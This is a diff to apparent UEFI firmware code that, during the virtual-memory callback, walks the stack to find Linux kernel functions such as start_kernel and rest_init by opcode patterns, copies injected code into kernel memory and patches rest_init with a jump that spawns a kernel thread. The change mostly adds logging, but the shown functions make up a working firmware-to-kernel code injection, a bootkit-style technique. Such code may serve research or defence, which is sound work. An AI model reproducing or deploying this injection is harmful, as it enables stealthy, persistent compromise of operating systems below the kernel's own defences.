@@ -400,10 +400,19 @@ FindArchCallRestInit(
     UINT8* cp;
     BOOLEAN found;
     INT32 offset;
+    EFI_STATUS status;
+
+    LOG_FUNCTION_ENTRY();
 
     if (Rsp == NULL || ArchCallRestInit == NULL || StartKernelRetAddr == NULL) {
-        return EFI_INVALID_PARAMETER;
+        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
+                 "Invalid parameters to FindArchCallRestInit");
+        status = EFI_INVALID_PARAMETER;
+        LOG_FUNCTION_EXIT(status);
+        return status;
     }
+
+    LOG_DEBUG("Searching for start_kernel return address (from stack[0x%x] to 0x40)", StartIndex + 1);
 
     //
     // Search further up the stack for start_kernel return address
@@ -413,6 +422,8 @@ FindArchCallRestInit(
             cp = (UINT8*)Rsp[i];
             found = TRUE;
 
+            LOG_VERBOSE("Checking stack[0x%x] = 0x%llx for call pattern", i, (UINT64)cp);
+
             //
             // Verify this looks like start_kernel by checking for
             // at least 10 consecutive call instructions
@@ -420,6 +431,7 @@ FindArchCallRestInit(
             for (j = 0; j < 10; j++) {
                 if (*cp != 0xe8) {  // 0xe8 = call opcode
                     found = FALSE;
+                    LOG_VERBOSE("Call pattern broken at offset %d (opcode 0x%x)", j, *cp);
                     break;
                 }
                 cp += 5;  // call instruction is 5 bytes
@@ -427,6 +439,7 @@ FindArchCallRestInit(
 
             if (found) {
                 *StartKernelRetAddr = (UINT8*)Rsp[i];
+                LOG_DEBUG("Found 10+ consecutive calls at 0x%llx", *StartKernelRetAddr);
 
                 //
                 // Skip over remaining call instructions until we find mfence
@@ -446,28 +459,28 @@ FindArchCallRestInit(
                     offset = *(INT32*)cp;
                     *ArchCallRestInit = (cp + 4) + offset;
 
-                    AsciiSPrint(StrBuffer, sizeof(StrBuffer),
-                               "Found start_kernel_retaddr @ 0x%llx\n", *StartKernelRetAddr);
-                    SerialOutString(StrBuffer);
+                    LOG_INFO("Found start_kernel return address: 0x%llx", *StartKernelRetAddr);
+                    LOG_ADDRESS(LOG_LEVEL_INFO, "arch_call_rest_init", *ArchCallRestInit);
 
-                    AsciiSPrint(StrBuffer, sizeof(StrBuffer),
-                               "arch_call_rest_init = 0x%llx\n", *ArchCallRestInit);
-                    SerialOutString(StrBuffer);
-
-                    return EFI_SUCCESS;
+                    status = EFI_SUCCESS;
+                    LOG_FUNCTION_EXIT(status);
+                    return status;
                 }
                 else {
-                    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Mfence not found\n");
-                    SerialOutString(StrBuffer);
+                    LOG_ERROR(INJECT_ERROR_MFENCE_NOT_FOUND,
+                             "mfence instruction not found after call sequence (found 0x%x%x%x)",
+                             *cp, *(cp + 1), *(cp + 2));
                 }
             }
         }
     }
 
-    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Did NOT find start_kernel return addr\n");
-    SerialOutString(StrBuffer);
+    LOG_ERROR(INJECT_ERROR_START_KERNEL_NOT_FOUND,
+             "start_kernel return address not found in stack range");
 
-    return EFI_NOT_FOUND;
+    status = EFI_NOT_FOUND;
+    LOG_FUNCTION_EXIT(status);
+    return status;
 }
 
 /**
@@ -492,13 +505,21 @@ FindRestInitCompleteCall(
 {
     UINT8* cp;
     INT32 offset;
+    EFI_STATUS status;
+
+    LOG_FUNCTION_ENTRY();
 
     if (ArchCallRestInit == NULL || RestInit == NULL ||
         CompleteCall == NULL || ReturnFromPatch == NULL) {
-        return EFI_INVALID_PARAMETER;
+        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
+                 "Invalid parameters to FindRestInitCompleteCall");
+        status = EFI_INVALID_PARAMETER;
+        LOG_FUNCTION_EXIT(status);
+        return status;
     }
 
     cp = ArchCallRestInit;
+    LOG_DEBUG("Analyzing arch_call_rest_init prologue at 0x%llx", (UINT64)cp);
 
     //
     // Verify arch_call_rest_init function prologue:
@@ -507,12 +528,17 @@ FindRestInitCompleteCall(
     //   mov rbp, rsp
     //   call rest_init
     //
+    LOG_VERBOSE("Checking prologue bytes: 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x",
+                *cp, *(cp+5), *(cp+6), *(cp+7), *(cp+8), *(cp+9));
+
     if (*cp != 0x0f || *(cp + 5) != 0x55 || *(cp + 6) != 0x48 ||
         *(cp + 7) != 0x89 || *(cp + 8) != 0xe5 || *(cp + 9) != 0xe8) {
-        AsciiSPrint(StrBuffer, sizeof(StrBuffer),
-                   "Failed to verify arch_call_rest_init prologue\n");
-        SerialOutString(StrBuffer);
-        return EFI_NOT_FOUND;
+        LOG_ERROR(INJECT_ERROR_REST_INIT_PROLOGUE_INVALID,
+                 "arch_call_rest_init prologue does not match expected pattern");
+        LOG_DEBUG("Expected: 0x0f ... 0x55 0x48 0x89 0xe5 0xe8");
+        status = EFI_NOT_FOUND;
+        LOG_FUNCTION_EXIT(status);
+        return status;
     }
 
     //
@@ -522,24 +548,26 @@ FindRestInitCompleteCall(
     offset = *(INT32*)cp;
     *RestInit = (cp + 4) + offset;
 
-    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "rest_init = 0x%llx\n", *RestInit);
-    SerialOutString(StrBuffer);
+    LOG_ADDRESS(LOG_LEVEL_INFO, "rest_init", *RestInit);
 
     //
     // Find the complete(&kthreadd_done) call in rest_init
     // Use kernel configuration for the offset
     //
     cp = *RestInit + gInjectConfig.KernelConfig->RestInitToCompleteOffset;
+    LOG_DEBUG("Looking for complete() call at rest_init+0x%x (0x%llx)",
+             gInjectConfig.KernelConfig->RestInitToCompleteOffset, (UINT64)cp);
 
     //
     // Verify this is a call instruction
     //
     if (*cp != 0xe8) {
-        AsciiSPrint(StrBuffer, sizeof(StrBuffer),
-                   "Expected call instruction at rest_init+0x%x, found 0x%x\n",
-                   gInjectConfig.KernelConfig->RestInitToCompleteOffset, *cp);
-        SerialOutString(StrBuffer);
-        return EFI_NOT_FOUND;
+        LOG_ERROR(INJECT_ERROR_COMPLETE_INVALID_INSN,
+                 "Expected call instruction (0xe8) at rest_init+0x%x, found 0x%x",
+                 gInjectConfig.KernelConfig->RestInitToCompleteOffset, *cp);
+        status = EFI_NOT_FOUND;
+        LOG_FUNCTION_EXIT(status);
+        return status;
     }
 
     *ReturnFromPatch = cp;
@@ -547,10 +575,12 @@ FindRestInitCompleteCall(
     offset = *(INT32*)cp;
     *CompleteCall = (cp + 4) + offset;
 
-    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "complete = 0x%llx\n", *CompleteCall);
-    SerialOutString(StrBuffer);
+    LOG_ADDRESS(LOG_LEVEL_DEBUG, "complete", *CompleteCall);
+    LOG_DEBUG("Return-from-patch address: 0x%llx", (UINT64)*ReturnFromPatch);
 
-    return EFI_SUCCESS;
+    status = EFI_SUCCESS;
+    LOG_FUNCTION_EXIT(status);
+    return status;
 }
 
 /**
@@ -574,10 +604,25 @@ InstallPatch2_KthreadCreate(
 {
     UINT8* cp;
     UINTN i;
+    EFI_STATUS status;
+
+    LOG_FUNCTION_ENTRY();
 
     if (StartKernelRetAddr == NULL || ReturnFromPatch == NULL || CompleteCall == NULL) {
-        return EFI_INVALID_PARAMETER;
+        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
+                 "Invalid parameters to InstallPatch2_KthreadCreate");
+        status = EFI_INVALID_PARAMETER;
+        LOG_FUNCTION_EXIT(status);
+        return status;
     }
+
+    //
+    // Calculate patch location
+    //
+    patch_2 = StartKernelRetAddr - sizeof(patch_code_2);
+    LOG_DEBUG("Patch 2 destination: 0x%llx", (UINT64)patch_2);
+    LOG_DEBUG("proc_template will be at: 0x%llx",
+             (UINT64)(StartKernelRetAddr - (sizeof(patch_code_2) + sizeof(proc_template))));
 
     //
     // Write the proc_template (thread code + data) immediately before patch_2
@@ -587,15 +632,16 @@ InstallPatch2_KthreadCreate(
     for (i = 0; i < sizeof(proc_template); i++) {
         *cp++ = proc_template[i];
     }
+    LOG_VERBOSE("Copied proc_template (%d bytes)", sizeof(proc_template));
 
     //
     // Write the patch_2 code (kthread allocation and creation)
     //
-    patch_2 = StartKernelRetAddr - sizeof(patch_code_2);
     cp = patch_2;
     for (i = 0; i < sizeof(patch_code_2); i++) {
         *cp++ = patch_code_2[i];
     }
+    LOG_VERBOSE("Copied patch_code_2 (%d bytes)", sizeof(patch_code_2));
 
     //
     // Fix up the call addresses in patch_2
@@ -604,18 +650,22 @@ InstallPatch2_KthreadCreate(
     // 1. call __kmalloc
     cp = patch_2 + 0x13;
     PUT_FIXUP(cp, __kmalloc);
+    LOG_VERBOSE("Fixed up __kmalloc call at offset 0x13");
 
     // 2. call kthread_create_on_node
     cp = patch_2 + 0x3d;
     PUT_FIXUP(cp, kthread_create_on_node);
+    LOG_VERBOSE("Fixed up kthread_create_on_node call at offset 0x3d");
 
     // 3. call complete(&kthreadd_done)
     cp = patch_2 + (sizeof(patch_code_2) - 9);
     PUT_FIXUP(cp, CompleteCall);
+    LOG_VERBOSE("Fixed up complete() call");
 
     // 4. jmp back to rest_init
     cp = patch_2 + (sizeof(patch_code_2) - 4);
     PUT_FIXUP(cp, (ReturnFromPatch + 5));
+    LOG_VERBOSE("Fixed up return jump to 0x%llx", (UINT64)(ReturnFromPatch + 5));
 
     //
     // Patch the rest_init() code to jump to our patch_2
@@ -624,11 +674,13 @@ InstallPatch2_KthreadCreate(
     *cp = 0xe9;  // direct near jmp opcode
     cp++;
     PUT_FIXUP(cp, patch_2);
+    LOG_DEBUG("Patched rest_init at 0x%llx with jump to patch_2", (UINT64)ReturnFromPatch);
 
-    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Patch 2 installed @ 0x%llx\n", patch_2);
-    SerialOutString(StrBuffer);
+    LOG_INFO("Patch 2 installed successfully at 0x%llx", (UINT64)patch_2);
 
-    return EFI_SUCCESS;
+    status = EFI_SUCCESS;
+    LOG_FUNCTION_EXIT(status);
+    return status;
 }
 
 /**
@@ -669,83 +721,102 @@ VirtMemCallback(
 	UNREFERENCED_PARAMETER(Context);
 
 	//
+	// Announce callback entry
+	//
+	LOG_INFO("=================================================");
+	LOG_INFO("VirtMemCallback Started - Beginning Injection");
+	LOG_INFO("=================================================");
+
+	//
 	// Get current stack pointer to search for kernel return addresses
 	//
 	rsp = AsmGetRsp();
 	printk = NULL;
+	LOG_DEBUG("Stack pointer: 0x%llx", (UINT64)rsp);
 
 	//
 	// Step 1: Find efi_enter_virtual_mode return address
 	//
+	LOG_INFO("Step 1: Finding efi_enter_virtual_mode return address");
 	efiStatus = FindEfiEnterVirtualModeReturnAddr(rsp, &eevmReturnAddr, &retaddrIndex);
 	if (EFI_ERROR(efiStatus)) {
-		return;  // Failed to find return address
+		LOG_ERROR(INJECT_ERROR_EEVM_NOT_FOUND, "Step 1 FAILED - Aborting injection");
+		return;
 	}
+	LOG_INFO("Step 1: SUCCESS");
 
 	//
 	// Step 2: Calculate kernel function addresses
 	//
+	LOG_INFO("Step 2: Calculating kernel function addresses");
 	efiStatus = CalculateKernelFunctionAddresses(eevmReturnAddr);
 	if (EFI_ERROR(efiStatus)) {
-		AsciiSPrint(StrBuffer, sizeof(StrBuffer),
-		           "Failed to calculate kernel addresses: %r\n", efiStatus);
-		SerialOutString(StrBuffer);
+		LOG_ERROR(INJECT_ERROR_PRINTK_CALC_FAILED, "Step 2 FAILED: %r", efiStatus);
 		return;
 	}
+	LOG_INFO("Step 2: SUCCESS");
 
 	//
 	// Step 3: Install Patch 1 - Printk banner
 	//
+	LOG_INFO("Step 3: Installing Patch 1 (printk banner)");
 	efiStatus = InstallPatch1_PrintkBanner(rsp, eevmReturnAddr, retaddrIndex);
 	if (EFI_ERROR(efiStatus)) {
-		AsciiSPrint(StrBuffer, sizeof(StrBuffer),
-		           "Failed to install Patch 1: %r\n", efiStatus);
-		SerialOutString(StrBuffer);
+		LOG_ERROR(INJECT_ERROR_PATCH1_INSTALL_FAILED, "Step 3 FAILED: %r", efiStatus);
 		return;
 	}
+	LOG_INFO("Step 3: SUCCESS");
 
 	//
 	// Step 4: Find arch_call_rest_init
 	//
+	LOG_INFO("Step 4: Finding arch_call_rest_init");
 	efiStatus = FindArchCallRestInit(rsp, retaddrIndex,
 	                                 &arch_call_rest_init,
 	                                 &startKernelReturnAddr);
 	if (EFI_ERROR(efiStatus)) {
-		return;  // Failed to find arch_call_rest_init
+		LOG_ERROR(INJECT_ERROR_ARCH_CALL_REST_INIT_INVALID, "Step 4 FAILED - Aborting injection");
+		return;
 	}
+	LOG_INFO("Step 4: SUCCESS");
 
 	//
 	// Step 5: Find rest_init and complete(&kthreadd_done) call
 	//
+	LOG_INFO("Step 5: Finding rest_init and complete() call");
 	efiStatus = FindRestInitCompleteCall(arch_call_rest_init,
 	                                     &restInitAddr,
 	                                     &completeAddr,
 	                                     &returnFromPatch);
 	if (EFI_ERROR(efiStatus)) {
-		return;  // Failed to find rest_init or complete call
+		LOG_ERROR(INJECT_ERROR_REST_INIT_NOT_FOUND, "Step 5 FAILED - Aborting injection");
+		return;
 	}
 
 	rest_init = restInitAddr;
 	complete = completeAddr;
+	LOG_INFO("Step 5: SUCCESS");
 
 	//
 	// Step 6: Install Patch 2 - Kernel thread creation
 	//
+	LOG_INFO("Step 6: Installing Patch 2 (kernel thread creation)");
 	efiStatus = InstallPatch2_KthreadCreate(startKernelReturnAddr,
 	                                        returnFromPatch,
 	                                        completeAddr);
 	if (EFI_ERROR(efiStatus)) {
-		AsciiSPrint(StrBuffer, sizeof(StrBuffer),
-		           "Failed to install Patch 2: %r\n", efiStatus);
-		SerialOutString(StrBuffer);
+		LOG_ERROR(INJECT_ERROR_PATCH2_INSTALL_FAILED, "Step 6 FAILED: %r", efiStatus);
 		return;
 	}
+	LOG_INFO("Step 6: SUCCESS");
 
 	//
 	// All patches installed successfully
 	//
-	AsciiSPrint(StrBuffer, sizeof(StrBuffer), "All patches installed successfully!\n");
-	SerialOutString(StrBuffer);
+	LOG_INFO("=================================================");
+	LOG_INFO("ALL PATCHES INSTALLED SUCCESSFULLY!");
+	LOG_INFO("Injection Complete - Control Returning to Kernel");
+	LOG_INFO("=================================================");
 }
 
 EFI_STATUS
